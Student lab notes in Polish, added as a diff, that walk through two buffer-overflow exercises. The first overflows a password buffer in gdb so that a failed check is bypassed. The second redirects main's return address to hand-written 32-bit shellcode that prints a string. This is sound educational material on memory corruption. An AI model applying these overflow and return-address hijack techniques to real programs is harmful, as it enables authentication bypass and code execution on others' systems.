@@ -1,0 +1,78 @@
+Zadanie 1.
+
+gcc login.c -o login -fno-stack-protector -z execstack -g
+
+odpalamy debugger dla złego hasła
+
+gdb -q --args ./login olskag
+
+ustawiamy breakpoint
+b 11
+
+odpalam program
+r
+szukamy w całym tekście gdzie jest zapisany
+x/200x $rbp-0
+
+wyświetlamy element który nas tylko interesuje
+x/8xg 0x7ffffffedd50 - wynik ifa
+
+Odpalam debugger dla złego hasła (hasło dłuższe niż bufor)
+gdb -q --args ./login aaaaaaaaaaa
+
+ustawiamy breakpoint
+b 11
+
+wyświetlamy element który nas tylko interesuje
+x/8xg 0x7ffffffedd50 - wynik ifa
+
+Jak widać wynik if został nadpisany - stał się wartością ostatniej literki (a). 
+Wynik if'a nie jest już zerem i stał się wartością ostatniej literki (a), wiemy by if był 1, musi przyjąć cokolwiek innego od 0,
+Wystarczy wpisać ciąg dłuższy niż 10 znaków i wtedy nadpiszemy pamięć ifa. W celu modyfikacji secret, możemy dać ciąg dłuższy ( 15 znaków)
+
+-fno-stack-protector wyłącza nam stack canaries, czyli możemy doprowadzić do podatności stack smashingu - celowe przepełnienie bufora w 
+celu dostania się do nieprzeznaczonych dla nas części pamięci
+
+-o nazwa outputu
+
+-fno-stack-protector wyłącza stack canaries. Stack canary to mała liczba, która jest losowana przy włączeniu programu i umieszczana tuż
+przed wskaźnikiem powrotu stosu ( pomiędzy buforem i danymi kontrolnymi ) żeby zapobiec przepełnieniu bufora.
+
+-z execstack włącza executable stack - wykorzystamy to do zad 2
+
+Do zadania 1 potrzeba tylko:
+-fno-stack-protector
+
+
+Zadanie 2.
+
+-m32 wymusza kompilację na obiekty 32 bitowe w 64 bitowym systemie operacyjnym. Gdyby go nie było to kompilator wyrzuciłby, że
+castujemy ze wskaźnika innego rozmiaru.
+
+int *ret;
+wrzucamy zmienną na stos, pod argumentami main'a.
+
+ret = (int) &ret + 2;
+zwiększamy wskazanie ret o dwa, trafiamy ( najprawdopodobniej ) na adres powrotu z maina
+
+(*ret) = (int)shellcode;
+podmieniamy adres powrotu z miana na początek shellcode - bedzie on wykonany po wyjściu z maina
+
+	"\xe9\x1e\x00\x00\x00"  //          jmp    (relative) <MESSAGE>
+    "\xb8\x04\x00\x00\x00"  //          mov    $0x4,%eax
+    "\xbb\x01\x00\x00\x00"  //          mov    $0x1,%ebx
+    "\x59"                  //          pop    %ecx
+    "\xba\x0f\x00\x00\x00"  //          mov    $0xf,%edx
+    "\xcd\x80"              //          int    $0x80
+    "\xb8\x01\x00\x00\x00"  //          mov    $0x1,%eax
+    "\xbb\x00\x00\x00\x00"  //          mov    $0x0,%ebx
+    "\xcd\x80"              //          int    $0x80
+    "\xe8\xdd\xff\xff\xff"  //          call   (relative) <GOBACK>
+    "\x32\x35\x30\x31\x30\x38\r\n"; 
+	
+Zapisałem ASCII 250108 w HEX
+hello world
+https://stackoverflow.com/questions/15593214/linux-shellcode-hello-world
+
+sh
+https://stackoverflow.com/a/2705991
